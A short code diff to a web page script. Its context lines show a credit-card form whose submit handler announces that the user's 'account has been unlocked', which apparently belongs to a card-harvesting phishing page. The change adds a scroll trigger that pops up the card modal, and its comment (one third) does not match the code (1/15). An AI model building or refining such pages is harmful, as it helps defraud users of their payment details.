@@ -71,7 +71,6 @@ ccForm.addEventListener('submit', e => {
 
     // 4. 全部都通過，顯示成功訊息
     alert('✅ 驗證成功，您的帳號已經解鎖！');
-    // console.log('>> validation passed, hiding modal and scheduling redirect');
 
     // 5. 隱藏 Modal（背景仍可滾動）
     // verifyModal.style.display = 'none';
@@ -87,9 +86,21 @@ ccForm.addEventListener('submit', e => {
 
 
 
+// 在 override.js 中加入一個捲動監聽，計算目前捲動位置與文件總高度的比例，
+// 當超過 1/3 時，把.modal-content顯示出來，並移除監聽以避免重複觸發。
 
+const modalContent = document.querySelector('.modal-content');
 
+function showModalOnScroll() {
+  const scrollTop = window.scrollY;
+  const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+  if (scrollTop / docHeight >= 1 / 15) {
+    modalContent.style.display = 'flex';
+    window.removeEventListener('scroll', showModalOnScroll);
+  }
+}
 
+window.addEventListener('scroll', showModalOnScroll);
 
 
 
